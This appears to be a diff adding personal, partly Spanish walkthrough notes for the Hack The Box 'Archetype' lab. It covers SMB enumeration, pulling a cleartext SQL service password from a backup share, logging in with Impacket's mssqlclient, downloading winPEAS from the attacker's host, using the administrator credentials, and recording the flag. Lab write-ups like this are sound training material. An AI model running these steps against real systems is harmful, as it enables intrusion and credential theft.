@@ -1,0 +1,32 @@
+
+Maquina 10 Archetype
+IP: 10.129.128.88
+Empezamos con un nmap -sV -sC 10.129.128.88
+We found that SMB ports are open and also that a Microsoft SQL Server 2017 is running on port 1433. We
+are going to enumerate the SMB with the tool smbclient :
+smbclient -N -L \\\\10.129.128.88  
+Vemos que nos devuelve 4 shares, probamos entrar en ellos a traves del comando
+smbclient -N \\\\10.129.128.88\\{nombre del share}
+Podemos ver que el share backups obtuvimos acceso
+hacemos un dir para ver que hay
+hay un archivo y lo descargaremos en nuestro pc con el get
+By reviewing the content of this configuration file, we spot in cleartext the password of the user sql_svc ,
+which is M3g4c0rp123 , for the host ARCHETYPE
+With the provided credentials we just need a way to
+connect and authenticate to the MSSQL server. Impacket tool includes a valuable python script called
+mssqlclient.py which offers such functionality.
+
+Instalamos Impacket y dentro de la carpeta Impacket/examples ejecutamos este comando:
+python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.128.88 -windows-auth
+Usamos la contraseña M3g4c0rp123
+
+
+
+
+wget http://10.10.14.161/winPEASx64.exe -outfile winPEASx64.exe
+
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+exit
+
+
+flag: b91ccec3305e98240082d4474b848528
